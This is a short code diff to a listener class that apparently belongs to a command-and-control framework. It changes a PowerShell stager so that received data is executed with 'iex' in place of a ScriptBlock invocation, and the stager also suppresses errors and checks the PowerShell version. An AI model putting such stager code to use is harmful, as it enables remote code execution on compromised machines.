@@ -254,7 +254,7 @@ class Listener:
         if language == "powershell":
             # PowerShell
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            stager += "function goForIT ($rdata) {([ScriptBlock]::Create($rdata)).Invoke()};"
+            stager += "function goForIT ($rdata) {iex $($rdata)};"
             
             if safeChecks.lower() == "true":
                 stager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){"
